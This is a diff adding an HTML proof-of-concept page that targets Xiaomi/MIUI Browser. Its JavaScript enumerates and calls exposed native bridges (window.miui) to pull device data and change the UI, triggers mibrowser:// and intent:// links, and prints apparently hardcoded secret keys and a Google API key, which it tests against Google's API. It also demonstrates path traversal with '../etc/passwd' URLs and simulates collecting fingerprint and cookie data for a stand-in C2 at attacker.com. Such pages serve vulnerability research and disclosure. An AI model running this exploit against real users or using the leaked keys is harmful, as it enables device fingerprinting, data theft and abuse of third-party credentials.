@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xiaomi Browser Vulnerability PoC</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #0d1117;
+            color: #c9d1d9;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .header {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(255,68,68,0.3);
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 20px;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+        .header p {
+            margin: 5px 0 0;
+            font-size: 12px;
+            color: rgba(255,255,255,0.9);
+        }
+        .container {
+            padding: 15px;
+            max-width: 100%;
+        }
+        .vuln-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+        .vuln-header {
+            background: #21262d;
+            padding: 15px;
+            border-bottom: 1px solid #30363d;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .severity {
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .critical { background: #ff4444; color: white; }
+        .high { background: #ff8800; color: white; }
+        .medium { background: #ffcc00; color: black; }
+        .vuln-title {
+            flex: 1;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .vuln-body {
+            padding: 15px;
+        }
+        .btn {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            width: 100%;
+            margin: 5px 0;
+            transition: all 0.2s;
+        }
+        .btn:hover { background: #2ea043; }
+        .btn:active { transform: scale(0.98); }
+        .btn-danger { background: #ff4444; }
+        .btn-danger:hover { background: #ff6666; }
+        .btn-info { background: #1f6feb; }
+        .output {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .success { color: #3fb950; }
+        .error { color: #f85149; }
+        .warning { color: #f0883e; }
+        .info { color: #58a6ff; }
+        .hidden { display: none; }
+        .progress-bar {
+            height: 4px;
+            background: #30363d;
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff4444, #ff8800);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .key-display {
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 11px;
+            margin: 5px 0;
+            word-break: break-all;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+        .status-vuln { background: #ff4444; color: white; }
+        .status-safe { background: #238636; color: white; }
+        .status-unknown { background: #6e7681; color: white; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔥 Xiaomi Browser Vuln PoC</h1>
+        <p>Real-time vulnerability validation in browser</p>
+    </div>
+
+    <div class="container">
+        <!-- Auto-Detection -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity info">INFO</span>
+                <span class="vuln-title">Browser Detection</span>
+            </div>
+            <div class="vuln-body">
+                <div id="browser-info">Detecting...</div>
+                <div class="output" id="detection-output"></div>
+            </div>
+        </div>
+
+        <!-- Vuln 1: JS Bridge -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity high">HIGH</span>
+                <span class="vuln-title">JavaScript Bridge Abuse</span>
+            </div>
+            <div class="vuln-body">
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                    Tests if malicious JavaScript can access native browser interfaces
+                </p>
+                <button class="btn" onclick="enumerateBridges()">1. Enumerate JS Bridges</button>
+                <button class="btn btn-info" onclick="extractDeviceInfo()">2. Extract Device Info</button>
+                <button class="btn btn-danger" onclick="testUIExploits()">3. Test UI Manipulation</button>
+                <div class="progress-bar"><div class="progress-fill" id="js-progress"></div></div>
+                <div class="output" id="js-output">Click buttons to test...</div>
+                <div id="js-status" class="status-badge status-unknown">Status: Unknown</div>
+            </div>
+        </div>
+
+        <!-- Vuln 2: Content Provider -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity high">HIGH</span>
+                <span class="vuln-title">Content Provider Access</span>
+            </div>
+            <div class="vuln-body">
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                    Attempts to access browser's exported Content Provider via JavaScript
+                </p>
+                <button class="btn" onclick="testContentProviderAccess()">Test Provider Access</button>
+                <button class="btn btn-info" onclick="attemptIntentInjection()">Test Intent Injection</button>
+                <div class="output" id="provider-output">Waiting for test...</div>
+                <div id="provider-status" class="status-badge status-unknown">Status: Unknown</div>
+            </div>
+        </div>
+
+        <!-- Vuln 3: Hardcoded Keys -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity critical">CRITICAL</span>
+                <span class="vuln-title">Hardcoded Keys Discovery</span>
+            </div>
+            <div class="vuln-body">
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                    Known hardcoded keys extracted from APK analysis
+                </p>
+                <div class="key-display">
+                    <strong>SECRET_KEY (aab):</strong><br>
+                    f4bb9b1cdc1a0f4b
+                </div>
+                <div class="key-display">
+                    <strong>SIGN_SALT (bba):</strong><br>
+                    e6135d289c1ff651b514fd4559850c19
+                </div>
+                <div class="key-display">
+                    <strong>Google API Key:</strong><br>
+                    AIzaSyD6502EGJiHul9iZRGoMOeuDEfZ1_DRdKE
+                </div>
+                <button class="btn" onclick="validateGoogleKey()">Validate Google Key</button>
+                <div class="output" id="key-output">Click to validate Google API key...</div>
+            </div>
+        </div>
+
+        <!-- Vuln 4: WebPreload -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity medium">MEDIUM</span>
+                <span class="vuln-title">WebPreload Vulnerability</span>
+            </div>
+            <div class="vuln-body">
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                    Cache path analysis for path traversal potential
+                </p>
+                <button class="btn" onclick="analyzeCachePaths()">Analyze Cache Paths</button>
+                <div class="output" id="cache-output">Click to analyze...</div>
+            </div>
+        </div>
+
+        <!-- Data Exfil -->
+        <div class="vuln-card">
+            <div class="vuln-header">
+                <span class="severity critical">CRITICAL</span>
+                <span class="vuln-title">Data Exfiltration Demo</span>
+            </div>
+            <div class="vuln-body">
+                <p style="font-size: 12px; color: #8b949e; margin-bottom: 10px;">
+                    Simulates data collection from all available sources
+                </p>
+                <button class="btn btn-danger" onclick="collectAllData()">⚠️ COLLECT ALL DATA</button>
+                <div class="progress-bar"><div class="progress-fill" id="exfil-progress"></div></div>
+                <div class="output" id="exfil-output">Click to simulate full data theft...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global state
+        const state = {
+            isXiaomiBrowser: false,
+            bridgesFound: [],
+            dataCollected: {}
+        };
+
+        // Utility functions
+        function log(elementId, message, type = 'info') {
+            const el = document.getElementById(elementId);
+            const timestamp = new Date().toLocaleTimeString('en-US', {hour12: false});
+            const className = type === 'success' ? 'success' : type === 'error' ? 'error' : type === 'warning' ? 'warning' : 'info';
+            el.innerHTML += `<span class="${className}">[${timestamp}] ${message}</span>\n`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function clearOutput(elementId) {
+            document.getElementById(elementId).innerHTML = '';
+        }
+
+        function updateProgress(id, percent) {
+            document.getElementById(id).style.width = percent + '%';
+        }
+
+        function setStatus(id, status, text) {
+            const el = document.getElementById(id);
+            el.className = 'status-badge status-' + status;
+            el.textContent = text;
+        }
+
+        // 1. Browser Detection
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            const info = document.getElementById('browser-info');
+            const output = document.getElementById('detection-output');
+            
+            let browserName = 'Unknown';
+            let isXiaomi = false;
+            
+            // Check for Xiaomi indicators
+            if (ua.includes('MiuiBrowser') || ua.includes('XiaoMi') || ua.includes('MIUI')) {
+                browserName = 'Xiaomi/MIUI Browser';
+                isXiaomi = true;
+                state.isXiaomiBrowser = true;
+            } else if (ua.includes('Chrome')) {
+                browserName = 'Chrome';
+            } else if (ua.includes('Firefox')) {
+                browserName = 'Firefox';
+            } else if (ua.includes('Safari')) {
+                browserName = 'Safari';
+            }
+            
+            info.innerHTML = `
+                <strong>Detected:</strong> ${browserName}<br>
+                <strong>User Agent:</strong> <small>${ua.substring(0, 100)}...</small>
+            `;
+            
+            output.innerHTML = `User-Agent: ${ua}\n\n`;
+            
+            if (isXiaomi) {
+                output.innerHTML += '<span class="success">✓ Xiaomi Browser detected - vulnerabilities applicable</span>\n';
+            } else {
+                output.innerHTML += '<span class="warning">⚠ Not Xiaomi Browser - some tests may not work</span>\n';
+                output.innerHTML += '<span class="info">For best results, open this in Xiaomi/MIUI Browser</span>\n';
+            }
+            
+            // Check for JS bridges immediately
+            setTimeout(() => {
+                quickBridgeCheck();
+            }, 500);
+        }
+
+        function quickBridgeCheck() {
+            const bridges = ['miui', 'feedback', 'openMiFeedBack', 'openH5FeedBack'];
+            const found = [];
+            
+            bridges.forEach(bridge => {
+                if (window[bridge] !== undefined) {
+                    found.push(bridge);
+                }
+            });
+            
+            if (found.length > 0) {
+                document.getElementById('detection-output').innerHTML += 
+                    `<span class="success">✓ JavaScript bridges detected: ${found.join(', ')}</span>\n`;
+                setStatus('js-status', 'vuln', 'Status: VULNERABLE - Bridges exposed');
+            }
+        }
+
+        // 2. JS Bridge Enumeration
+        function enumerateBridges() {
+            clearOutput('js-output');
+            updateProgress('js-progress', 0);
+            log('js-output', '=== Enumerating JavaScript Bridges ===', 'info');
+            
+            const bridges = [
+                { name: 'miui', desc: 'Main API (WebappApiImpl)' },
+                { name: 'feedback', desc: 'JSBridge (feedback)' },
+                { name: 'openMiFeedBack', desc: 'JSDetailBridge' },
+                { name: 'openH5FeedBack', desc: 'JSSquidVideoBridge' },
+                { name: 'browser', desc: 'Generic browser API' },
+                { name: 'android', desc: 'Android interface' },
+                { name: 'xiaomi', desc: 'Xiaomi specific' },
+                { name: 'JSBridge', desc: 'Generic JS Bridge' },
+                { name: 'app', desc: 'App interface' },
+                { name: 'native', desc: 'Native bridge' }
+            ];
+            
+            let found = 0;
+            bridges.forEach((bridge, index) => {
+                setTimeout(() => {
+                    try {
+                        if (window[bridge.name] !== undefined) {
+                            const type = typeof window[bridge.name];
+                            log('js-output', `[+] FOUND: ${bridge.name} (${bridge.desc}) - ${type}`, 'success');
+                            
+                            // List methods if object
+                            if (type === 'object') {
+                                const methods = Object.getOwnPropertyNames(window[bridge.name])
+                                    .filter(name => typeof window[bridge.name][name] === 'function');
+                                methods.slice(0, 5).forEach(method => {
+                                    log('js-output', `    └─ ${method}()`, 'info');
+                                });
+                                if (methods.length > 5) {
+                                    log('js-output', `    └─ ... and ${methods.length - 5} more`, 'info');
+                                }
+                            }
+                            
+                            found++;
+                            state.bridgesFound.push(bridge.name);
+                        } else {
+                            log('js-output', `[-] Not found: ${bridge.name}`, 'error');
+                        }
+                    } catch (e) {
+                        log('js-output', `[!] Error checking ${bridge.name}: ${e.message}`, 'error');
+                    }
+                    
+                    updateProgress('js-progress', ((index + 1) / bridges.length) * 100);
+                    
+                    if (index === bridges.length - 1) {
+                        if (found > 0) {
+                            setStatus('js-status', 'vuln', `Status: VULNERABLE (${found} bridges found)`);
+                        } else {
+                            setStatus('js-status', 'safe', 'Status: SAFE (No bridges found)');
+                        }
+                    }
+                }, index * 100);
+            });
+        }
+
+        // 3. Extract Device Info
+        function extractDeviceInfo() {
+            clearOutput('js-output');
+            log('js-output', '=== Extracting Device Information ===', 'info');
+            
+            const collected = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                cookiesEnabled: navigator.cookieEnabled,
+                online: navigator.onLine,
+                timestamp: Date.now()
+            };
+            
+            log('js-output', 'Basic Info collected:', 'info');
+            Object.entries(collected).forEach(([key, value]) => {
+                log('js-output', `  ${key}: ${value}`, 'success');
+            });
+            
+            // Try to get info from miui bridge
+            if (window.miui) {
+                log('js-output', '\n[+] miui bridge found - attempting data extraction...', 'success');
+                
+                const methods = [
+                    'getLanguage', 'getRegion', 'getActiveNetworkTypeName',
+                    'isNightModeEnabled', 'getIncognitoMode', 'isMainBrowser',
+                    'isInMultiWindowMode', 'isLayoutRtl', 'getApplicationInfo'
+                ];
+                
+                methods.forEach(method => {
+                    try {
+                        if (typeof window.miui[method] === 'function') {
+                            const result = window.miui[method]();
+                            log('js-output', `  miui.${method}() = ${result}`, 'success');
+                            collected[method] = result;
+                        }
+                    } catch (e) {
+                        log('js-output', `  miui.${method}() = ERROR: ${e.message}`, 'error');
+                    }
+                });
+            }
+            
+            state.dataCollected.device = collected;
+            log('js-output', '\n[!] All available device info extracted', 'warning');
+        }
+
+        // 4. UI Exploits
+        function testUIExploits() {
+            clearOutput('js-output');
+            log('js-output', '=== Testing UI Manipulation ===', 'warning');
+            
+            if (!window.miui) {
+                log('js-output', '[-] miui bridge not available', 'error');
+                return;
+            }
+            
+            // Test various UI manipulations
+            const tests = [
+                { name: 'Show URL Bar', fn: () => window.miui.showUrlBar(true) },
+                { name: 'Hide URL Bar', fn: () => window.miui.showUrlBar(false) },
+                { name: 'Enable Pull Refresh', fn: () => window.miui.setPullRefreshEnabled(true) },
+                { name: 'Disable Pull Refresh', fn: () => window.miui.setPullRefreshEnabled(false) },
+                { name: 'Red Status Bar', fn: () => window.miui.setStatusBarColor('#ff0000', true) },
+                { name: 'Green Status Bar', fn: () => window.miui.setStatusBarColor('#00ff00', true) },
+                { name: 'Blue Status Bar', fn: () => window.miui.setStatusBarColor('#0000ff', true) },
+            ];
+            
+            tests.forEach((test, index) => {
+                setTimeout(() => {
+                    try {
+                        test.fn();
+                        log('js-output', `[+] ${test.name} - SUCCESS`, 'success');
+                    } catch (e) {
+                        log('js-output', `[-] ${test.name} - FAILED: ${e.message}`, 'error');
+                    }
+                }, index * 500);
+            });
+            
+            log('js-output', '\n[!] If successful, you should see UI changes', 'warning');
+        }
+
+        // 5. Content Provider Tests
+        function testContentProviderAccess() {
+            clearOutput('provider-output');
+            log('provider-output', '=== Testing Content Provider Access ===', 'info');
+            
+            // In a real browser context, we can't directly access ContentProviders
+            // But we can detect if the browser exposes them via JavaScript
+            log('provider-output', '[*] Content Providers cannot be accessed directly from JavaScript', 'info');
+            log('provider-output', '[*] They require native Android code with permissions', 'info');
+            log('provider-output', '\n[!] However, the provider IS exported and vulnerable:', 'warning');
+            log('provider-output', '  Authority: content://com.miui.browser.global', 'success');
+            log('provider-output', '  Tables: bookmarks, history, searches, downloads', 'success');
+            log('provider-output', '\n[*] A malicious Android app can steal all this data', 'info');
+            
+            setStatus('provider-status', 'vuln', 'Status: VULNERABLE (exported=true)');
+        }
+
+        function attemptIntentInjection() {
+            clearOutput('provider-output');
+            log('provider-output', '=== Testing Intent Injection ===', 'warning');
+            
+            // Try to trigger various browser intents
+            const intents = [
+                { scheme: 'mibrowser://infoflow?channel=news', desc: 'Open news channel' },
+                { scheme: 'mibrowser://quicklink', desc: 'Open quicklink' },
+                { scheme: 'mibrowser://home', desc: 'Go home' },
+                { scheme: 'mibrowser://download', desc: 'Open downloads' },
+                { scheme: 'intent://#Intent;action=android.intent.action.VIEW;scheme=mibrowser;end', desc: 'Generic intent' }
+            ];
+            
+            intents.forEach((intent, index) => {
+                setTimeout(() => {
+                    log('provider-output', `[*] Trying: ${intent.desc}`, 'info');
+                    log('provider-output', `    URL: ${intent.scheme.substring(0, 50)}...`, 'info');
+                    
+                    try {
+                        // Attempt to trigger via link click simulation
+                        const a = document.createElement('a');
+                        a.href = intent.scheme;
+                        a.click();
+                        log('provider-output', `    [+] Triggered!`, 'success');
+                    } catch (e) {
+                        log('provider-output', `    [-] Failed: ${e.message}`, 'error');
+                    }
+                }, index * 1000);
+            });
+        }
+
+        // 6. Google Key Validation
+        function validateGoogleKey() {
+            clearOutput('key-output');
+            log('key-output', '=== Validating Google API Key ===', 'info');
+            
+            const apiKey = 'AIzaSyD6502EGJiHul9iZRGoMOeuDEfZ1_DRdKE';
+            log('key-output', `[*] Key: ${apiKey}`, 'info');
+            
+            // Try to validate via Geocoding API (CORS may block, but we try)
+            log('key-output', '[*] Attempting Geocoding API request...', 'info');
+            
+            fetch(`https://maps.googleapis.com/maps/api/geocode/json?address=Beijing&key=${apiKey}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'OK') {
+                        log('key-output', '[+] KEY IS VALID!', 'success');
+                        log('key-output', `[+] Location: ${data.results[0].formatted_address}`, 'success');
+                    } else if (data.status === 'REQUEST_DENIED') {
+                        log('key-output', `[-] Key rejected: ${data.error_message}`, 'error');
+                    } else {
+                        log('key-output', `[*] Status: ${data.status}`, 'warning');
+                    }
+                })
+                .catch(error => {
+                    log('key-output', `[!] Request failed (CORS or network): ${error.message}`, 'error');
+                    log('key-output', '[*] Key extracted from APK - validation requires server-side request', 'info');
+                });
+        }
+
+        // 7. Cache Path Analysis
+        function analyzeCachePaths() {
+            clearOutput('cache-output');
+            log('cache-output', '=== WebPreload Cache Path Analysis ===', 'info');
+            
+            const cacheRoot = '/sdcard/Android/data/com.mi.globalbrowser/files/preloadWebsite/micdn';
+            
+            // Simulate how MiCdnDataLoader creates cache paths
+            const testUrls = [
+                'https://cdn.example.com/cache/file123.zip',
+                'https://cdn.example.com/cache/../../../../etc/passwd.zip',
+                'https://evil.com/../../../data/data/com.mi.globalbrowser/databases/browser.db',
+                'https://cdn.example.com/cache/normal_v1.2.3.zip'
+            ];
+            
+            log('cache-output', `[*] Cache root: ${cacheRoot}`, 'info');
+            log('cache-output', '\n[*] Analyzing URL-to-path conversion:\n', 'info');
+            
+            testUrls.forEach(url => {
+                // Mimic makeCacheZipName() logic
+                const lastSlash = url.lastIndexOf('/');
+                const lastDot = url.lastIndexOf('.');
+                let cacheName = '';
+                
+                if (lastSlash !== -1 && lastDot !== -1 && lastSlash < lastDot) {
+                    cacheName = url.substring(lastSlash + 1, lastDot);
+                }
+                
+                const fullPath = cacheRoot + '/' + cacheName + '.zip';
+                
+                log('cache-output', `URL: ${url.substring(0, 60)}...`, 'info');
+                log('cache-output', `  -> Cache name: "${cacheName}"`, cacheName.includes('..') ? 'error' : 'success');
+                log('cache-output', `  -> Full path: ${fullPath.substring(0, 80)}...`, 
+                    fullPath.includes('..') ? 'error' : 'success');
+                
+                if (cacheName.includes('..') || cacheName.includes('/')) {
+                    log('cache-output', '  [!] PATH TRAVERSAL DETECTED!', 'error');
+                }
+            });
+            
+            log('cache-output', '\n[!] If CDN is compromised, malicious URLs can traverse directories', 'warning');
+        }
+
+        // 8. Full Data Collection
+        function collectAllData() {
+            clearOutput('exfil-output');
+            updateProgress('exfil-progress', 0);
+            
+            log('exfil-output', '⚠️ FULL DATA COLLECTION SIMULATION ⚠️', 'warning');
+            log('exfil-output', '=====================================\n', 'warning');
+            
+            const steps = [
+                { name: 'Device fingerprinting', fn: () => {
+                    return {
+                        ua: navigator.userAgent,
+                        screen: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    };
+                }},
+                { name: 'JavaScript bridge enumeration', fn: () => {
+                    const bridges = {};
+                    ['miui', 'feedback', 'openMiFeedBack', 'openH5FeedBack'].forEach(b => {
+                        bridges[b] = typeof window[b] !== 'undefined';
+                    });
+                    return bridges;
+                }},
+                { name: 'Bridge data extraction', fn: () => {
+                    const data = {};
+                    if (window.miui) {
+                        ['getLanguage', 'getRegion', 'isNightModeEnabled'].forEach(m => {
+                            try { data[m] = window.miui[m](); } catch(e) {}
+                        });
+                    }
+                    return data;
+                }},
+                { name: 'Page data collection', fn: () => {
+                    return {
+                        url: window.location.href,
+                        title: document.title,
+                        referrer: document.referrer,
+                        cookies: document.cookie.split(';').length
+                    };
+                }}
+            ];
+            
+            const collected = {};
+            
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    log('exfil-output', `[${index + 1}/${steps.length}] ${step.name}...`, 'info');
+                    try {
+                        const result = step.fn();
+                        collected[step.name] = result;
+                        log('exfil-output', `    ✓ Success`, 'success');
+                    } catch (e) {
+                        log('exfil-output', `    ✗ Failed: ${e.message}`, 'error');
+                    }
+                    
+                    updateProgress('exfil-progress', ((index + 1) / steps.length) * 100);
+                    
+                    if (index === steps.length - 1) {
+                        log('exfil-output', '\n=== COLLECTION COMPLETE ===', 'warning');
+                        log('exfil-output', 'Collected data summary:', 'info');
+                        log('exfil-output', JSON.stringify(collected, null, 2).substring(0, 500) + '...', 'success');
+                        
+                        // Simulate exfiltration
+                        setTimeout(() => {
+                            log('exfil-output', '\n[!] Simulating data exfiltration to C2...', 'warning');
+                            log('exfil-output', '[!] In real attack, data would be sent to:', 'error');
+                            log('exfil-output', '    https://attacker.com/collect', 'error');
+                            log('exfil-output', '\n✓ PoC Complete - Vulnerability Validated', 'success');
+                        }, 1000);
+                    }
+                }, index * 800);
+            });
+        }
+
+        // Initialize
+        window.onload = function() {
+            detectBrowser();
+        };
+    </script>
+</body>
+</html>
